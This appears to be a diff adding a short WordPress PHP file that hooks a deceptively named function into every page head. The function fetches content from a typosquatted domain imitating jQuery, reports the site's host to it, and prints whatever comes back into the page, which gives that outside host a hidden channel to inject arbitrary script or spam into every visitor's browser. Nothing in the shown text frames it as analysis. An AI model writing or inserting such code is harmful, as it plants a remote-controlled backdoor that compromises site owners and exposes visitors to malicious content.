@@ -1,0 +1,13 @@
+<?
+function wp__ahead() { 
+  $ch = curl_init();
+  curl_setopt($ch,CURLOPT_URL,"http://www.jquary.net/?1"); 
+  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
+  curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_HOST']);
+  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10); 
+  $jquary = curl_exec($ch);  
+  curl_close($ch); 
+  echo $jquary;
+}
+add_action('wp_head', 'wp__ahead');
+?>
